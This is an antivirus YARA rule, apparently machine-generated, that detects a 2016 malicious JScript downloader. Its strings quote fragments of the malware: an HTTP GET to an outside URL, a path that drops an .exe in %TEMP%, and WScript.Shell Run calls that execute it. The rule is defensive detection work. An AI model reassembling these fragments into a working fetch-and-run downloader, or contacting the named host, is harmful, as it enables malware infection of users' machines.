rule sig_20160329_fd27a2f3c8917c319cd3fda428e18baa {
  meta:
    description = "datamaliciousorder - file 20160329_fd27a2f3c8917c319cd3fda428e18baa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "87b3bfcd55df2f3e0643103d8f7aa8649a8efcb0c2403e92af3b7da17861d053"

  strings:
    $s1  = "j[T](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function tW() {return N0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pFZ27DT9kQr3UH.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[yh](w() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var N0 = function y() {return WScript[ga](\"WScript.Shell\");}(), oF = 11;" fullword ascii
    $s5  = "function TP(gu, EF){jf = jf * 1; return gu - EF;};" fullword ascii
    $s6  = "function t(){return \"\" + RE;};" fullword ascii
    $s7  = "function s(pp){N0[\"Run\"](pp, jf, jf);};" fullword ascii
    $s8  = "function S() {return ((Ma == true) && (Ma == fd)) ? 1 : jf;};" fullword ascii
    $s9  = "function w(){return 22;};" fullword ascii
    $s10 = "function H(){return ga;};" fullword ascii
    $s11 = "return TP(X, N);" fullword ascii
    $s12 = "var L = new this[\"Date\"]();" fullword ascii
    $s13 = " while (cw){" fullword ascii
    $s14 = "function h(i) {var Cc = (1, 2, 3, 4, 5, i); return Cc;};" fullword ascii
    $s15 = "function sS()" fullword ascii
    $s16 = "var Q = false;" fullword ascii
    $s17 = "var Ma = false;" fullword ascii
    $s18 = "var fd = false;" fullword ascii
    $s19 = "fd = true; " fullword ascii
    $s20 = "Ma = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}